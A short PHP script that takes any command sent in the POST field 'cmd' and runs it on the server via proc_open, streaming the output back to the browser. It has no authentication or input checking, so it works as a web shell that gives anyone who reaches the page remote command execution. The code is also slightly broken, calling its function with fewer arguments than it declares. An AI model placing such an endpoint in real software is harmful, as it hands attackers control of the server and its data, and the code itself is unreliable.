<?php
header('X-Accel-Buffering: no');

# this code can be removed
$cmd = $_POST['cmd'];
if(isset($_POST['cmd'])) {
	shell_execute($cmd, true);
}else {
	#echo "Empty $cmd\n";
}

#function call
function shell_execute($cmd, $debug, &$output) {
	if($debug == true) {
		echo "Executing command $cmd\n";
	}
        ob_flush();flush();
        $descriptorspec = array(
                        0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
                        1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
                        2 => array("pipe", "w")    // stderr is a pipe that the child will write to
                        );
        flush();
        $process = proc_open($cmd, $descriptorspec, $pipes, realpath('./'), array());
        echo "<pre>";
        if (is_resource($process)) {
                while ($s = fgets($pipes[1])) {
			if($debug == true) {
				print $s;
				ob_flush();flush();
			}
			$output .= $s;
                }
                return true;
        }
        echo "</pre>";
        return false;
}
?>
